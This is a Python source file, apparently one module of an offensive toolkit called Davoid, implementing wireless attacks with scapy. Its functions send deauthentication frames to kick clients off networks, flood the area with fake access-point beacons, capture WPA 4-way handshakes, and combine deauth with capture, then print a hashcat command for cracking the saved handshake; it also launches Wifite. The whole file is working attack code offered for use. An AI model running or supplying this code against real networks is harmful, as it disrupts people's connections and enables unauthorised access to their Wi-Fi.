import time
import os
import threading
import sys
import subprocess
import questionary
from scapy.all import (RadioTap, Dot11, Dot11Deauth, Dot11Beacon, Dot11Elt,
                       sendp, sniff, wrpcap, conf)
from rich.console import Console
from rich.panel import Panel
from core.ui import draw_header, Q_STYLE

console = Console()


class WiFiSuite:
    def __init__(self):
        self.stop_hopping  = threading.Event()
        self.stop_deauth   = threading.Event()   # used by combo mode

    def check_monitor_mode(self, iface):
        """Checks if the interface is actually in monitor mode."""
        try:
            mode_path = f"/sys/class/net/{iface}/type"
            if os.path.exists(mode_path):
                with open(mode_path, 'r') as f:
                    if f.read().strip() != "803":
                        console.print(
                            f"[yellow][!] Warning: {iface} might not be "
                            f"in Monitor Mode.[/yellow]")
        except Exception:
            pass

    def channel_hopper(self, iface):
        """Hopping channels is required to find targets and capture handshakes."""
        channels = [1, 6, 11, 2, 7, 12, 3, 8, 13, 4, 9, 5, 10]
        while not self.stop_hopping.is_set():
            for channel in channels:
                if self.stop_hopping.is_set():
                    break
                try:
                    subprocess.run(
                        ["iwconfig", str(iface), "channel", str(channel)],
                        check=True,
                        stdout=subprocess.DEVNULL,
                        stderr=subprocess.DEVNULL)
                except subprocess.CalledProcessError:
                    pass
                time.sleep(0.5)

    def deauth_attack(self, target_mac, bssid, iface):
        """
        Sends deauthentication frames to disconnect a client.
        Reason 7: Class 3 frame received from nonassociated station.
        """
        pkt1 = RadioTap() / Dot11(
            addr1=target_mac, addr2=bssid, addr3=bssid) / Dot11Deauth(reason=7)
        pkt2 = RadioTap() / Dot11(
            addr1=bssid, addr2=target_mac, addr3=bssid) / Dot11Deauth(reason=7)

        console.print(Panel(
            f"Target: {target_mac}\nAP: {bssid}\nIface: {iface}",
            title="[bold red]Deauth Attack Active[/bold red]",
            border_style="red"))

        try:
            while True:
                sendp(pkt1, iface=iface, count=5, inter=0.1, verbose=False)
                sendp(pkt2, iface=iface, count=5, inter=0.1, verbose=False)
        except KeyboardInterrupt:
            console.print("\n[yellow][*] Deauth stopped.[/yellow]")

    def _deauth_loop(self, target_mac, bssid, iface):
        """
        Background deauth loop used by the combo attack.
        Runs until self.stop_deauth is set.
        """
        pkt1 = RadioTap() / Dot11(
            addr1=target_mac, addr2=bssid, addr3=bssid) / Dot11Deauth(reason=7)
        pkt2 = RadioTap() / Dot11(
            addr1=bssid, addr2=target_mac, addr3=bssid) / Dot11Deauth(reason=7)

        while not self.stop_deauth.is_set():
            try:
                sendp(pkt1, iface=iface, count=3, inter=0.1, verbose=False)
                sendp(pkt2, iface=iface, count=3, inter=0.1, verbose=False)
                time.sleep(2)   # burst every 2 seconds to force re-association
            except Exception:
                break

    def beacon_flood(self, iface):
        """Floods the vicinity with fake Access Points."""
        ssids = [
            "Free Public WiFi", "Home_Network_Ext",
            "Starbucks_Unsecured", "FBI Surveillance Van"]
        pkts = []
        for s in ssids:
            mac = "00:11:22:{:02x}:{:02x}:{:02x}".format(
                time.time_ns() % 255,
                time.time_ns() % 250,
                time.time_ns() % 245)
            dot11  = Dot11(type=0, subtype=8,
                           addr1="ff:ff:ff:ff:ff:ff", addr2=mac, addr3=mac)
            beacon = Dot11Beacon(cap="ESS+privacy")
            essid  = Dot11Elt(ID="SSID", info=s, len=len(s))
            dsset  = Dot11Elt(ID="DSset", info="\x01")
            pkts.append(RadioTap() / dot11 / beacon / essid / dsset)

        console.print(
            "[bold red][!] Flooding beacons. Interference started...[/bold red]")
        try:
            while True:
                for p in pkts:
                    sendp(p, iface=iface, count=1, verbose=False)
                time.sleep(0.1)
        except KeyboardInterrupt:
            return

    def capture_handshake(self, iface, bssid):
        """
        Passive handshake sniffer with EAPOL filtering.
        Optimized to capture the 4-way WPA handshake.
        """
        console.print(f"[*] Monitoring {bssid} for WPA Handshake...")

        self.stop_hopping.clear()
        hopper = threading.Thread(
            target=self.channel_hopper, args=(iface,), daemon=True)
        hopper.start()

        captured_handshakes = []

        def packet_handler(pkt):
            if pkt.haslayer(Dot11):
                if pkt.haslayer('EAPOL'):
                    captured_handshakes.append(pkt)
                    console.print(
                        f"[bold green][+] Captured EAPOL Packet from "
                        f"{pkt.addr2}[/bold green]")

        try:
            sniff(iface=iface, prn=packet_handler, timeout=120, store=0)

            if captured_handshakes:
                if not os.path.exists("logs"):
                    os.makedirs("logs")
                fname = (f"logs/handshake_{bssid.replace(':', '')}"
                         f"_{int(time.time())}.pcap")
                wrpcap(fname, captured_handshakes)
                console.print(
                    f"[bold green][!] Success: Handshake saved to {fname}[/bold green]")
            else:
                console.print(
                    "[red][!] Timeout: No handshake captured within 2 minutes.[/red]")

        finally:
            self.stop_hopping.set()

    def deauth_and_capture(self, target_mac, bssid, iface):
        """
        COMBO MODE: Simultaneously deauths the target to force a
        WPA re-association while capturing the resulting 4-way handshake.
        This is the standard real-world attack flow.
        """
        console.print(Panel(
            f"[bold white]Target MAC :[/bold white] {target_mac}\n"
            f"[bold white]AP BSSID   :[/bold white] {bssid}\n"
            f"[bold white]Interface  :[/bold white] {iface}\n\n"
            "[dim]Deauth frames will be sent every 2 seconds.\n"
            "Capture runs for 120 seconds or until handshake is caught.\n"
            "Press Ctrl+C to abort early.[/dim]",
            title="[bold red]Deauth + Capture Combo[/bold red]",
            border_style="red"))

        # Reset events
        self.stop_deauth.clear()
        self.stop_hopping.clear()

        # Start background deauth thread
        deauth_thread = threading.Thread(
            target=self._deauth_loop,
            args=(target_mac, bssid, iface),
            daemon=True)
        deauth_thread.start()

        # Start channel hopper on the AP's channel if known,
        # otherwise hop normally
        hopper = threading.Thread(
            target=self.channel_hopper, args=(iface,), daemon=True)
        hopper.start()

        captured_handshakes = []

        def packet_handler(pkt):
            if pkt.haslayer(Dot11) and pkt.haslayer('EAPOL'):
                captured_handshakes.append(pkt)
                n = len(captured_handshakes)
                console.print(
                    f"[bold green][+] EAPOL frame {n}/4 captured "
                    f"from {pkt.addr2}[/bold green]")
                # Full 4-way handshake = 4 EAPOL frames
                if n >= 4:
                    console.print(
                        "[bold green][+] Full 4-way handshake captured! "
                        "Stopping...[/bold green]")
                    # Signal deauth to stop — we have what we need
                    self.stop_deauth.set()

        console.print(
            "[*] Deauth loop running in background. "
            "Listening for WPA handshake (120s timeout)...\n")

        try:
            sniff(iface=iface, prn=packet_handler, timeout=120, store=0)
        except KeyboardInterrupt:
            console.print("\n[yellow][*] Combo aborted by user.[/yellow]")
        finally:
            self.stop_deauth.set()
            self.stop_hopping.set()

        if captured_handshakes:
            if not os.path.exists("logs"):
                os.makedirs("logs")
            fname = (f"logs/handshake_combo_{bssid.replace(':', '')}"
                     f"_{int(time.time())}.pcap")
            wrpcap(fname, captured_handshakes)
            console.print(
                f"\n[bold green][+] Handshake saved to {fname}[/bold green]")
            console.print(
                f"[dim]Crack it with: hashcat -m 22000 {fname} wordlist.txt[/dim]")
        else:
            console.print(
                "[red][!] No handshake captured. "
                "Target may not have reconnected.[/red]")

    def run_wifite(self):
        """Pro Feature: Automated WiFi Hacking via Wifite"""
        console.print("[*] Checking for Wifite installation...")
        if (not os.path.exists("/usr/sbin/wifite")
                and not os.path.exists("/usr/bin/wifite")
                and subprocess.call(
                    ["which", "wifite"],
                    stdout=subprocess.DEVNULL,
                    stderr=subprocess.DEVNULL) != 0):
            console.print("[bold red][!] Wifite is not installed.[/bold red]")
            console.print("[white]Install it via: sudo apt install wifite[/white]")
            return

        console.print(
            "[bold green][+] Launching Wifite Automated Attack Engine...[/bold green]")
        console.print(
            "[dim]Press Ctrl+C to exit Wifite and return to Davoid.[/dim]")
        time.sleep(2)

        try:
            subprocess.call(["sudo", "wifite"])
        except Exception as e:
            console.print(f"[red][!] Error running Wifite: {e}[/red]")

    def run(self):
        if hasattr(os, 'getuid') and os.getuid() != 0:
            return console.print(
                "[red][!] Root required for raw socket WiFi operations.[/red]")

        draw_header("Wireless Offensive Suite Pro")

        choice = questionary.select(
            "Select Attack Module:",
            choices=[
                "1. Automated WiFi Hacking (Wifite)",
                "2. Deauth Target (Kick users)",
                "3. Capture WPA Handshake (Passive)",
                "4. Deauth + Capture Combo (Recommended)",   # ← new
                "5. Beacon Flood (Fake APs)",
            ],
            style=Q_STYLE
        ).ask()

        if not choice:
            return

        # Wifite handles its own interface selection
        if "Wifite" in choice:
            self.run_wifite()
            questionary.press_any_key_to_continue(style=Q_STYLE).ask()
            return

        iface = questionary.text(
            "Monitor Interface (e.g., wlan0mon):", style=Q_STYLE).ask()
        if not iface:
            return

        self.check_monitor_mode(iface)

        if "Deauth + Capture" in choice:
            target = questionary.text(
                "Target Client MAC (FF:FF:FF:FF:FF:FF for broadcast):",
                style=Q_STYLE).ask()
            bssid = questionary.text(
                "Access Point BSSID:", style=Q_STYLE).ask()
            if target and bssid:
                self.deauth_and_capture(target, bssid, iface)
            questionary.press_any_key_to_continue(style=Q_STYLE).ask()

        elif "Deauth" in choice:
            target = questionary.text(
                "Target Client MAC (FF:FF:FF:FF:FF:FF for all):",
                style=Q_STYLE).ask()
            bssid = questionary.text(
                "Access Point BSSID:", style=Q_STYLE).ask()
            self.deauth_attack(target, bssid, iface)

        elif "Capture" in choice:
            bssid = questionary.text(
                "Target BSSID:", style=Q_STYLE).ask()
            self.capture_handshake(iface, bssid)

        elif "Beacon" in choice:
            self.beacon_flood(iface)


def run_wifi_suite():
    try:
        suite = WiFiSuite()
        suite.run()
    except Exception as e:
        console.print(f"[red][!] WiFi Suite Error: {e}[/red]")


if __name__ == "__main__":
    run_wifi_suite()